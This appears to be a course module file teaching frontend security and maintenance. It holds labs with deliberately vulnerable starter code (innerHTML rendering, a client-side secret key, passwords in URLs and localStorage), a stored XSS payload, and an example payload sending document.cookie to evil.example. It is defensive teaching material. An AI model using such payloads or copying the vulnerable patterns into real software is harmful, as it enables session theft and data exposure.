/**
 * RESPONSIVE WEB DEVELOPMENT · MODULE 31 · SECURITY AND MAINTENANCE
 *
 * Curriculum 31.1 – 31.12. What a frontend developer must know to keep a
 * site and its users safe, and to keep it working after launch: what the
 * browser can and cannot be trusted with, XSS and safe DOM updates, why
 * server-side validation is required, HTTPS, dependencies, credentials,
 * authentication and authorization, common mistakes, debugging a live site
 * and maintaining it. Every lab is a real vulnerable or broken page to fix.
 *
 * ─────────────────────────────────────────────────────────────────────────
 * THIS FILE IS CLIENT-SAFE. Assessment answers live in lib/academy/.
 * ─────────────────────────────────────────────────────────────────────────
 */

export const SECTION_ID = "wd-s31-security";

const WALL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Guestbook · Ojo Photography</title>
  <link rel="stylesheet" href="style.css">
  <script type="module" src="app.js"></script>
</head>
<body>
  <main>
    <h1>Guestbook</h1>
    <ul id="comments"></ul>
    <form id="comment-form">
      <label for="name">Name</label>
      <input id="name" required>
      <label for="comment">Comment</label>
      <textarea id="comment" required></textarea>
      <button type="submit">Post</button>
    </form>
  </main>
</body>
</html>
`;

const WALL_DATA = `// Given: comments already saved on the server. One was posted by an attacker.
export const COMMENTS = [
  { name: "Ngozi", text: "Beautiful wedding photos, thank you!" },
  { name: "<img src=x onerror=\\"document.title='hacked'\\">", text: "Great work" },
];
`;

const WALL_JS = `import { COMMENTS } from "./comments.js";

const list = document.querySelector("#comments");

function render() {
  list.innerHTML = "";
  for (const c of COMMENTS) {
    list.innerHTML += \`<li><strong>\${c.name}</strong>: \${c.text}</li>\`;
  }
}

document.querySelector("#comment-form").addEventListener("submit", (event) => {
  event.preventDefault();
  COMMENTS.push({
    name: document.querySelector("#name").value,
    text: document.querySelector("#comment").value,
  });
  render();
  event.target.reset();
});

render();
`;

const WALL_JS_DONE = `import { COMMENTS } from "./comments.js";

const list = document.querySelector("#comments");

// Builds one comment from elements. textContent shows text as text, so
// anything a visitor types, including HTML, is never run as code.
function commentItem(c) {
  const li = document.createElement("li");
  const name = document.createElement("strong");
  name.textContent = c.name;
  li.append(name, \`: \${c.text}\`);
  return li;
}

function render() {
  list.replaceChildren(...COMMENTS.map(commentItem));
}

document.querySelector("#comment-form").addEventListener("submit", (event) => {
  event.preventDefault();
  COMMENTS.push({
    name: document.querySelector("#name").value,
    text: document.querySelector("#comment").value,
  });
  render();
  event.target.reset();
});

render();
`;

const ORDER_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Order · Lagos Leather</title>
  <link rel="stylesheet" href="style.css">
  <script type="module" src="app.js"></script>
</head>
<body>
  <header>
    <img src="http://cdn.lagosleather.ng/logo.svg" alt="Lagos Leather" width="120" height="40">
  </header>
  <main>
    <h1>Place an order</h1>
    <form id="order">
      <label for="product">Product</label>
      <select id="product">
        <option value="tote">Leather tote · ₦7500</option>
        <option value="sandals">Leather sandals · ₦18000</option>
      </select>
      <label for="quantity">Quantity</label>
      <input id="quantity" type="number" min="1" max="10" value="1" required>
      <button type="submit">Order</button>
    </form>
    <p id="message" role="status"></p>
  </main>
</body>
</html>
`;

const ORDER_JS = `const PAYSTACK_SECRET = "sk_live_51f0c2e9a7d4b8";
const PRICES = { tote: 7500, sandals: 18000 };

document.querySelector("#order").addEventListener("submit", async (event) => {
  event.preventDefault();
  const productId = document.querySelector("#product").value;
  const quantity = Number(document.querySelector("#quantity").value);
  const total = PRICES[productId] * quantity;

  const res = await fetch("https://api.paystack.co/transaction/initialize", {
    method: "POST",
    headers: { Authorization: \`Bearer \${PAYSTACK_SECRET}\`, "Content-Type": "application/json" },
    body: JSON.stringify({ productId, quantity, total }),
  });
  const data = await res.json();
  document.querySelector("#message").textContent = data.message;
});
`;

const ORDER_JS_DONE = `// The browser sends only what the customer chose. Our server looks up the
// price, checks the quantity again and holds the payment key, because
// anything in this file can be read and changed by the visitor.
document.querySelector("#order").addEventListener("submit", async (event) => {
  event.preventDefault();
  const productId = document.querySelector("#product").value;
  const quantity = Number(document.querySelector("#quantity").value);
  const message = document.querySelector("#message");

  const res = await fetch("/api/orders", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ productId, quantity }),
  });
  const data = await res.json();
  message.textContent = res.ok ? \`Order \${data.orderId} placed. Total ₦\${data.total}.\` : data.error;
});
`;

const LOGIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Staff area · Eko Courier</title>
  <link rel="stylesheet" href="style.css">
  <script type="module" src="app.js"></script>
</head>
<body>
  <main>
    <h1>Staff area</h1>
    <form id="login">
      <label for="email">Email</label>
      <input id="email" type="email" autocomplete="username" required>
      <label for="password">Password</label>
      <input id="password" type="password" autocomplete="current-password" required>
      <button type="submit">Sign in</button>
    </form>
    <section id="account" hidden>
      <p id="welcome"></p>
      <button id="reports-btn" type="button">View reports</button>
      <button id="logout" type="button">Sign out</button>
      <ul id="reports"></ul>
    </section>
    <p id="message" role="status"></p>
  </main>
</body>
</html>
`;

const LOGIN_JS = `const REPORTS = ["Revenue this month: ₦4.2m", "Refunds: 12"];

document.querySelector("#login").addEventListener("submit", async (event) => {
  event.preventDefault();
  const email = document.querySelector("#email").value;
  const password = document.querySelector("#password").value;
  localStorage.setItem("email", email);
  localStorage.setItem("password", password);

  const res = await fetch(\`/api/login?email=\${email}&password=\${password}\`);
  const data = await res.json();
  document.querySelector("#welcome").textContent = \`Signed in as \${data.user.name}\`;
  document.querySelector("#account").hidden = false;
});

document.querySelector("#reports-btn").addEventListener("click", () => {
  if (localStorage.getItem("isAdmin") === "true") {
    document.querySelector("#reports").innerHTML = REPORTS.map((r) => \`<li>\${r}</li>\`).join("");
  } else {
    document.querySelector("#message").textContent = "Admins only.";
  }
});
`;

const LOGIN_JS_DONE = `// The server decides who someone is (authentication) and what they may see
// (authorization). The browser keeps only the session token it was given.
let token = null;

const message = document.querySelector("#message");
const account = document.querySelector("#account");

document.querySelector("#login").addEventListener("submit", async (event) => {
  event.preventDefault();
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: document.querySelector("#email").value,
      password: document.querySelector("#password").value,
    }),
  });
  if (!res.ok) {
    message.textContent = "Email or password is incorrect.";
    return;
  }
  const data = await res.json();
  token = data.token;
  sessionStorage.setItem("token", token);
  event.target.reset();
  document.querySelector("#welcome").textContent = \`Signed in as \${data.user.name} (\${data.user.role})\`;
  account.hidden = false;
});

document.querySelector("#reports-btn").addEventListener("click", async () => {
  const list = document.querySelector("#reports");
  const res = await fetch("/api/admin/reports", { headers: { Authorization: \`Bearer \${token}\` } });
  const data = await res.json();
  if (res.status === 401) {
    message.textContent = "Please sign in again.";
  } else if (!res.ok) {
    message.textContent = data.error;
  } else {
    list.replaceChildren(...data.reports.map((r) => Object.assign(document.createElement("li"), { textContent: r })));
  }
});

document.querySelector("#logout").addEventListener("click", () => {
  token = null;
  sessionStorage.removeItem("token");
  account.hidden = true;
  document.querySelector("#reports").replaceChildren();
  message.textContent = "Signed out.";
});
`;

const LIVE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Shop · Aba Shoes</title>
  <link rel="stylesheet" href="style.css">
  <script type="module" src="app.js"></script>
</head>
<body>
  <main>
    <h1>Our shoes</h1>
    <button id="refresh" type="button">Refresh stock</button>
    <p id="status" role="status"></p>
    <ul id="products"></ul>
  </main>
</body>
</html>
`;

const LIVE_JS = `async function loadProducts() {
  const res = await fetch("/api/products");
  const products = await res.json();
  const list = document.querySelector("#products");
  for (const p of products) {
    const li = document.createElement("li");
    li.textContent = \`\${p.name} · ₦\${p.price.amount.toLocaleString("en-NG")}\`;
    list.append(li);
  }
}

document.querySelector("#refresh").addEventListener("click", async () => {
  const res = await fetch("/api/stock");
  const stock = await res.json();
  document.querySelector("#status").textContent = \`\${stock.count} pairs in stock\`;
});

loadProducts();
`;

const LIVE_JS_DONE = `// Formats a product for the list. Products without a price yet (new stock
// still being priced) show "Price on request" instead of breaking the page.
function productLine(p) {
  const amount = p.price?.amount;
  return amount == null ? \`\${p.name} · Price on request\` : \`\${p.name} · ₦\${amount.toLocaleString("en-NG")}\`;
}

async function loadProducts() {
  const res = await fetch("/api/products");
  const products = await res.json();
  const list = document.querySelector("#products");
  for (const p of products) {
    const li = document.createElement("li");
    li.textContent = productLine(p);
    list.append(li);
  }
}

document.querySelector("#refresh").addEventListener("click", async () => {
  const status = document.querySelector("#status");
  try {
    const res = await fetch("/api/stock");
    if (!res.ok) throw new Error(\`Stock request failed with status \${res.status}\`);
    const stock = await res.json();
    status.textContent = \`\${stock.count} pairs in stock\`;
  } catch (error) {
    console.error(error);
    status.textContent = "Could not check stock. Please try again.";
  }
});

loadProducts();
`;

const CHANGELOG = `# Changelog

All notable changes to the Aba Shoes site.

## 1.3.0 · 2026-09-02
- Added the Refresh stock button.
`;

const CHANGELOG_DONE = `# Changelog

All notable changes to the Aba Shoes site.

## 1.3.1 · 2026-10-19
- Fixed: the product list stopped at the first product without a price; it now shows "Price on request".
- Fixed: Refresh stock showed "undefined pairs in stock" when the stock service was down; it now shows a friendly message.

## 1.3.0 · 2026-09-02
- Added the Refresh stock button.
`;

const BASE_CSS = `body { margin: 0; font-family: Arial, sans-serif; }
main { padding: 16px; max-width: 640px; }
label, input, select, textarea, button { display: block; margin-top: 8px; }
`;

export const LESSONS = [
  /* ═══════════════════════════════════════════════════════════════════
     LESSON 145 · 31.1 – 31.3
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "wd-l145-xss",
    moduleId: "wd-m31-security",
    sectionId: SECTION_ID,
    order: 1,
    covers: ["31.1", "31.2", "31.3"],
    title: "Trust, XSS and Safe DOM Updates",
    subtitle: "What the browser can be trusted with, and the attack every frontend must stop",
    estimatedMinutes: 26,
    intro: "Security starts with one fact: everything in the browser belongs to the visitor. They can read your code, change it and send anything they like. This lesson draws the line between client and server, then fixes the most common frontend vulnerability.",

    atoms: [
      {
        id: "a-wd-client-vs-server",
        title: "Client-side versus server-side responsibilities",
        explain:
          "The client (browser) is for presentation and convenience: showing data, helpful validation, fast interactions. The server is for anything that must be trusted: checking who someone is, deciding what they may do, calculating prices, validating every input again, keeping secrets and storing data. Assume an attacker can run any JavaScript in their own browser and send any request to your server, because they can. Hiding a button is not security; refusing the request on the server is.",
        table: {
          caption: "Where each job belongs.",
          headers: ["Job", "Browser", "Server"],
          rows: [
            ["Show helpful form errors", "Yes", "Also validates"],
            ["Calculate the price to charge", "Show an estimate", "Yes, always"],
            ["Keep API secret keys", "Never", "Yes"],
            ["Decide whether a user may see admin data", "Never", "Yes"],
            ["Hide a menu item the user cannot use", "Yes, for tidiness", "Still refuses the request"],
          ],
        },
      },
      {
        id: "a-wd-xss",
        title: "Cross-site scripting (XSS) fundamentals",
        explain:
          "XSS is an attacker getting their code to run on your page in other visitors' browsers. It usually happens when text someone else wrote (a comment, a name, a search term, data from an API) is inserted with innerHTML: the browser parses it as HTML, and an attribute such as onerror runs JavaScript. That code then acts as the visitor: it can read what is on the page, change it, or send requests with their session. One unsafe innerHTML can compromise every visitor who views the page.",
        example: "// A \"name\" posted by an attacker:\n<img src=x onerror=\"fetch('https://evil.example/?c=' + document.cookie)\">\n\n// Inserted with innerHTML, the image fails to load, onerror runs,\n// and the code executes in every visitor's browser.",
      },
      {
        id: "a-wd-safe-dom",
        title: "Safe DOM updates",
        explain:
          "Treat all data as text unless you wrote the HTML yourself. textContent sets text, never markup, so it is always safe. Build structure with createElement, append and replaceChildren, and put data in with textContent or attributes set through properties. If you truly must insert HTML from elsewhere (for example a blog's formatted body), clean it first with a sanitiser library such as DOMPurify, and never put data into onclick attributes, javascript: URLs or eval.",
        webLab: {
          task:
            "This guestbook builds each comment with innerHTML, so the attacker's saved comment runs code (look at the tab title). Rewrite render() so every comment is built with createElement and textContent: an li containing a strong with the name, then \": \" and the comment. Clear and fill the list with replaceChildren, and use no innerHTML anywhere. Posting a new comment must still work, and any HTML a visitor types must appear as plain text.",
          files: { "index.html": WALL_HTML, "style.css": BASE_CSS, "app.js": WALL_JS, "comments.js": WALL_DATA },
          readOnly: ["index.html", "style.css", "comments.js"],
          tests: [
            { label: "The attacker's saved comment does not run", check: "return document.title !== 'hacked' && !$('#comments img');", fail: "Do not parse comment data as HTML: set it with textContent." },
            { label: "Saved comments show as text: an li with a strong name", check: "const li = $$('#comments li'); return li.length === 2 && text(li[0]) === 'Ngozi: Beautiful wedding photos, thank you!' && text(li[0].querySelector('strong')) === 'Ngozi' && text(li[1].querySelector('strong')).startsWith('<img');", fail: "For each comment, create an li and a strong, set the strong's textContent to the name, then append \": \" and the text." },
            { label: "A new comment containing HTML appears as plain text", check: "await type('#name', 'Tolu'); await type('#comment', '<b onmouseover=alert(1)>Lovely</b>'); await submit('#comment-form'); const li = $$('#comments li'); return li.length === 3 && text(li[2]) === 'Tolu: <b onmouseover=alert(1)>Lovely</b>' && !$('#comments b');", fail: "The submit handler should push the comment and call your safe render()." },
            { label: "No innerHTML anywhere in app.js", check: "return !/innerHTML/.test(code('app.js')) && /replaceChildren/.test(code('app.js'));", fail: "Use list.replaceChildren(...) to clear and fill the list." },
            { label: "No errors", check: "return errors().length === 0;", fail: "Check the console panel." },
          ],
          solution: { "app.js": WALL_JS_DONE },
          hint: "li.append(strong, `: ${c.text}`) appends the element and then a text node, and a text node is never parsed as HTML.",
          successMessage: "The attack is now harmless text. Search your own projects for innerHTML and check that none of them insert data you did not write.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 146 · 31.4 – 31.7
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "wd-l146-validation-https-secrets",
    moduleId: "wd-m31-security",
    sectionId: SECTION_ID,
    order: 2,
    covers: ["31.4", "31.5", "31.6", "31.7"],
    title: "Validation, HTTPS, Dependencies and Credentials",
    subtitle: "Never trust the browser, encrypt everything, keep packages current and secrets secret",
    estimatedMinutes: 26,
    intro: "Four rules that prevent most real-world frontend incidents. The lab is an order form that breaks all of them at once.",

    atoms: [
      {
        id: "a-wd-frontend-validation-limits",
        title: "Why frontend validation is not sufficient",
        explain:
          "Module 22's validation is for the visitor: instant, friendly feedback. It is not protection. Anyone can remove a max attribute in DevTools, switch off JavaScript, or skip your page entirely and send a request with any values. So the server validates every input again, and calculates anything that matters, such as prices and totals, itself. Your page should send only what the visitor chose and show the server's error clearly when it refuses.",
      },
      {
        id: "a-wd-https-connections",
        title: "HTTPS and secure connections",
        explain:
          "HTTPS encrypts traffic so nobody on the same network can read or change it, which matters on public Wi-Fi and for every login and payment. Your host provides the certificate (Module 29). Every resource the page loads must also use https: an http:// image, script or API on an HTTPS page is mixed content, which browsers block or warn about. Use https:// or relative URLs everywhere, and never send passwords or tokens in a URL, where they end up in logs and history.",
      },
      {
        id: "a-wd-dependency-updates",
        title: "Dependency updates",
        explain:
          "Every package in package.json is code you ship or build with, and vulnerabilities are found in popular packages regularly. npm outdated lists packages with newer versions; npm audit lists known vulnerabilities, and npm audit fix applies safe updates. Update regularly, one change at a time, and run the tests and the build after each. Remove packages you no longer use, and be wary of new packages with few downloads or names one letter away from popular ones (typosquatting). Commit package-lock.json so every install gets exactly the same versions.",
        example: "npm outdated          # what has newer versions\nnpm audit             # known vulnerabilities\nnpm audit fix         # apply compatible fixes\nnpm uninstall moment  # remove what you no longer use\nnpm test && npm run build",
      },
      {
        id: "a-wd-protect-credentials",
        title: "Protecting API credentials",
        explain:
          "Anything in frontend code, including VITE_ environment variables, is public: it is in the bundle anyone can download. Publishable keys (Paystack's pk_, Google Maps keys restricted to your domain) are designed for this. Secret keys (sk_, database passwords, private tokens) must only ever live on a server: your page calls your own endpoint, and the server adds the secret and talks to the payment or email service. If a secret is ever committed or shipped, rotate it at once: deleting it later does not remove it from history.",
        webLab: {
          task:
            "This order form puts a Paystack secret key in the browser, calculates the total on the client and sends it, and loads its logo over http. Fix all three: remove the key and the price list, send a POST to your own /api/orders endpoint with JSON containing only productId and quantity (the server sets the price), and load the logo over https. The server re-checks the quantity: when it refuses, show its error message in #message. Test it by doing what an attacker would: remove the input's max and order 50.",
          files: { "index.html": ORDER_HTML, "style.css": BASE_CSS, "app.js": ORDER_JS },
          readOnly: ["style.css"],
          mocks: [
            { match: "/api/orders", method: "POST", status: 422, body: { error: "Quantity must be between 1 and 10." }, delay: 40 },
          ],
          tests: [
            { label: "No secret key or price list in the browser code", check: "return !/sk_live|sk_test|SECRET/i.test(code('app.js')) && !/7500|18000/.test(code('app.js'));", fail: "Delete PAYSTACK_SECRET and PRICES: the server holds the key and the prices." },
            { label: "Ordering sends a POST to /api/orders, and nothing to Paystack directly", check: "await submit('#order'); await waitFor(() => fetchCalls().length > 0); const c = fetchCalls()[0]; return c.url.includes('/api/orders') && c.method === 'POST' && !fetchCalls().some((f) => /paystack/.test(f.url));", fail: "fetch(\"/api/orders\", { method: \"POST\", ... })." },
            { label: "The request contains only productId and quantity", check: "const c = fetchCalls().find((f) => f.url.includes('/api/orders')); let b; try { b = JSON.parse(c.body); } catch { return false; } return Object.keys(b).sort().join(',') === 'productId,quantity' && b.productId === 'tote' && b.quantity === 1;", fail: "body: JSON.stringify({ productId, quantity }), with quantity as a number." },
            { label: "A tampered order of 50 shows the server's refusal", check: "$('#quantity').removeAttribute('max'); await type('#quantity', '50'); await submit('#order'); await waitFor(() => text('#message') !== ''); return text('#message') === 'Quantity must be between 1 and 10.';", fail: "If the response is not ok, show data.error in #message." },
            { label: "No resources loaded over http://", check: "return !/(src|href)=\"http:\\/\\//.test(code('index.html'));", fail: "Change the logo's src to https://." },
          ],
          solution: { "index.html": ORDER_HTML.replace("http://cdn.", "https://cdn."), "app.js": ORDER_JS_DONE },
          hint: "Check res.ok: a 422 response still has a JSON body, here with an error property.",
          successMessage: "No secret to steal, no price to tamper with, and the server's word is final. This is how every real checkout is built.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 147 · 31.8 – 31.10
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "wd-l147-auth",
    moduleId: "wd-m31-security",
    sectionId: SECTION_ID,
    order: 3,
    covers: ["31.8", "31.9", "31.10"],
    title: "Authentication, Authorization and Common Mistakes",
    subtitle: "Who you are, what you may do, and the errors that leak both",
    estimatedMinutes: 28,
    intro: "Login pages are where frontend mistakes become data breaches. You will not build the server side here, but you must know how it works so your frontend uses it correctly.",

    atoms: [
      {
        id: "a-wd-authentication",
        title: "Authentication concepts",
        explain:
          "Authentication is proving who you are, usually with an email and password, sometimes with a one-time code (two-factor authentication) or a provider such as Google. The password is sent once, in the body of a POST request over HTTPS, never in a URL. The server checks it against a stored hash and returns a session: either a cookie the browser sends automatically (best set HttpOnly, Secure and SameSite so JavaScript and other sites cannot use it) or a token your code sends with each request. Never store the password itself anywhere in the browser.",
      },
      {
        id: "a-wd-authorization",
        title: "Authorization concepts",
        explain:
          "Authorization is deciding what an authenticated user may do: an editor may publish, only an admin may see revenue. It is checked on the server for every request. The response codes tell your page what happened: 401 Unauthorized means \"we do not know who you are, sign in\"; 403 Forbidden means \"we know who you are, and you may not do this\". The frontend may hide controls a user cannot use, but it must never decide access itself, and admin data must never be in the frontend code at all.",
      },
      {
        id: "a-wd-security-mistakes",
        title: "Common web security mistakes",
        explain:
          "The mistakes that cause real breaches are simple. Secrets or private data in frontend code. Access decided by a flag in localStorage, which anyone can change. Passwords stored in the browser or sent in URLs. Data inserted with innerHTML. Trusting client-calculated prices. Detailed error messages that reveal how the server works. Outdated dependencies. And debug pages or test accounts left on the live site.",
        webLab: {
          task:
            "This staff page makes four classic mistakes: it stores the password in localStorage, sends it in the URL, decides admin access from a localStorage flag, and ships the admin reports in the code. Fix them. Sign in with a POST to /api/login, with the email and password in a JSON body, and keep only the returned token, in sessionStorage. Show \"Signed in as Ada (editor)\" from the server's user. View reports must request /api/admin/reports with the token in an Authorization header and show the server's error message when it refuses. Sign out clears the token and hides the account section.",
          files: { "index.html": LOGIN_HTML, "style.css": BASE_CSS, "app.js": LOGIN_JS },
          readOnly: ["index.html", "style.css"],
          mocks: [
            { match: "/api/login", method: "POST", status: 200, body: { token: "tok_8c1d77", user: { name: "Ada", role: "editor" } }, delay: 40 },
            { match: "/api/admin/reports", status: 403, body: { error: "You do not have permission to view reports." }, delay: 40 },
          ],
          tests: [
            { label: "Signing in sends a POST with the credentials in the body, not the URL", check: "await type('#email', 'ada@ekocourier.ng'); await type('#password', 'kola-pass-22'); await submit('#login'); await waitFor(() => fetchCalls().length > 0); const c = fetchCalls()[0]; let b = {}; try { b = JSON.parse(c.body); } catch { return false; } return c.url.includes('/api/login') && c.method === 'POST' && !/pass/.test(c.url) && b.email === 'ada@ekocourier.ng' && b.password === 'kola-pass-22';", fail: "fetch(\"/api/login\", { method: \"POST\", headers: …, body: JSON.stringify({ email, password }) })." },
            { label: "The welcome comes from the server: \"Signed in as Ada (editor)\"", check: "await waitFor(() => text('#welcome') !== ''); return text('#welcome') === 'Signed in as Ada (editor)' && visible('#account');", fail: "Use data.user.name and data.user.role, and unhide #account." },
            { label: "The password is not stored anywhere; the token is in sessionStorage", check: "const all = [localStorage, sessionStorage].flatMap((s) => Object.keys(s).map((k) => s.getItem(k))); return !all.some((v) => String(v).includes('kola-pass-22')) && sessionStorage.getItem('token') === 'tok_8c1d77';", fail: "Remove the localStorage.setItem lines and save only data.token with sessionStorage.setItem(\"token\", …)." },
            { label: "Admin reports are not in the browser code", check: "return !/4\\.2m|Refunds/.test(code('app.js')) && !/isAdmin/.test(code('app.js'));", fail: "Delete REPORTS and the isAdmin check: the server decides." },
            { label: "Sign out clears the token and hides the account section", check: "await click('#logout'); return !visible('#account') && !sessionStorage.getItem('token');", fail: "On sign out, remove the token and set account.hidden = true." },
            { label: "Even with isAdmin faked in storage, View reports asks the server and shows its 403 message", seed: { isAdmin: "true" }, check: "await type('#email', 'ada@ekocourier.ng'); await type('#password', 'kola-pass-22'); await submit('#login'); await waitFor(() => visible('#account')); await click('#reports-btn'); await waitFor(() => fetchCalls().some((c) => c.url.includes('/api/admin/reports'))); await waitFor(() => text('#message') !== ''); return text('#message') === 'You do not have permission to view reports.' && $$('#reports li').length === 0;", fail: "On click, fetch /api/admin/reports and, if the response is not ok, show data.error in #message." },
            { label: "The reports request sends the token", check: "return /Authorization/.test(code('app.js')) && /Bearer/.test(code('app.js'));", fail: "headers: { Authorization: `Bearer ${token}` }." },
          ],
          solution: { "app.js": LOGIN_JS_DONE },
          hint: "Keep the token in a variable and in sessionStorage; nothing else about the user needs saving.",
          successMessage: "Credentials sent once and safely, nothing sensitive left behind, and every access decision made by the server.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 148 · 31.11 – 31.12
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "wd-l148-live-maintenance",
    moduleId: "wd-m31-security",
    sectionId: SECTION_ID,
    order: 4,
    covers: ["31.11", "31.12"],
    title: "Debugging Live Websites and Maintenance",
    subtitle: "Fixing what breaks after launch, and keeping a site healthy for years",
    estimatedMinutes: 24,
    intro: "A site is never finished. Data changes, services go down and browsers update. This lesson is the routine that keeps a live site working, and the documentation that lets someone else take it over.",

    atoms: [
      {
        id: "a-wd-debug-live",
        title: "Debugging live websites",
        explain:
          "When something breaks in production: reproduce it on the live URL with DevTools open and read the console and Network panel. Live bugs are usually caused by real data your test data never had (a missing field, a long name), a service being down, or a difference between the build and the dev server. Source maps let DevTools show your original code. Error-tracking services such as Sentry report errors from visitors' browsers so you hear about bugs before customers complain. Fix it, add a test for it, and record it in the changelog.",
      },
      {
        id: "a-wd-maintenance-docs",
        title: "Maintenance and documentation",
        explain:
          "Maintenance is a schedule, not a reaction: monthly dependency updates and audits, checks that forms and links still work, Lighthouse runs, renewing domains, and backups of anything not in Git. Documentation is what lets you, or the next developer, maintain it: a README (what it is, how to run, build and deploy it, which environment variables it needs), a CHANGELOG with the date and what changed in each release, and comments explaining why unusual code exists.",
        webLab: {
          task:
            "The live shop broke after new stock arrived. The product list stops at a product with no price yet, and when the stock service is down, Refresh stock shows \"undefined pairs in stock\". Fix both: products without a price show \"Price on request\", and if /api/stock fails, log the error with console.error and show \"Could not check stock. Please try again.\" Then add a 1.3.1 entry at the top of CHANGELOG.md, with a date and a line for each fix.",
          files: { "index.html": LIVE_HTML, "style.css": BASE_CSS, "app.js": LIVE_JS, "CHANGELOG.md": CHANGELOG },
          readOnly: ["index.html", "style.css"],
          mocks: [
            {
              match: "/api/products",
              status: 200,
              body: [
                { name: "Brown oxford", price: { amount: 24000 } },
                { name: "Suede loafer", price: null },
                { name: "Leather sandal", price: { amount: 12500 } },
              ],
              delay: 40,
            },
            { match: "/api/stock", status: 503, body: { error: "Service unavailable" }, delay: 40 },
          ],
          tests: [
            { label: "All three products show; the unpriced one says \"Price on request\"", check: "await waitFor(() => $$('#products li').length === 3); const li = $$('#products li').map((l) => text(l)); return li[0] === 'Brown oxford · ₦24,000' && li[1] === 'Suede loafer · Price on request' && li[2] === 'Leather sandal · ₦12,500';", fail: "Check p.price?.amount before formatting it." },
            { label: "When the stock service is down, a friendly message shows", check: "await click('#refresh'); await waitFor(() => text('#status') !== ''); return text('#status') === 'Could not check stock. Please try again.';", fail: "Check res.ok; if it is false, throw, catch it and show the message." },
            { label: "The failure is logged with console.error", check: "await waitFor(() => text('#status') !== ''); return logs().some((l) => /^\\[error\\]/.test(l) || /error/i.test(l));", fail: "console.error(error) in the catch block." },
            { label: "No uncaught errors", check: "return errors().length === 0;", fail: "The missing price throws a TypeError: guard it." },
            { label: "CHANGELOG.md has a dated 1.3.1 entry above 1.3.0, with a line for each fix", check: "const c = raw('CHANGELOG.md'); const i = c.indexOf('1.3.1'), j = c.indexOf('1.3.0'); if (i < 0 || j < 0 || i > j) return false; const entry = c.slice(i, j); return /\\d{4}-\\d{2}-\\d{2}/.test(entry) && (entry.match(/^- /gm) || []).length >= 2;", fail: "Add \"## 1.3.1 · YYYY-MM-DD\" above 1.3.0 with two \"- \" lines." },
          ],
          solution: { "app.js": LIVE_JS_DONE, "CHANGELOG.md": CHANGELOG_DONE },
          hint: "fetch only rejects when the network fails. A 503 is a response, so check res.ok yourself.",
          successMessage: "Both production bugs fixed, the failure visible to you in the logs but friendly for visitors, and a record of what changed.",
        },
      },
    ],

    task: {
      title: "Module project: secure and document your site",
      intro: "Use the site you deployed and improved in Modules 29 and 30.",
      prompts: [
        "Search the code for innerHTML and replace every use that inserts data you did not write.",
        "Search the code and the Git history for secret keys; move any to a server or serverless function and rotate them.",
        "Run npm outdated and npm audit, update what you can one package at a time, and run the tests and the build after each.",
        "Check that every resource loads over HTTPS and that no forms send data in URLs.",
        "Write or update the README (run, build, deploy, environment variables) and start a CHANGELOG.",
        "Write a one-page maintenance plan: what you check monthly and who renews the domain.",
      ],
      closing: "Next module: turning your projects into a portfolio and working with clients.",
    },
    requirements: { read: true, video: false, assessment: true },
  },
];

export default LESSONS;
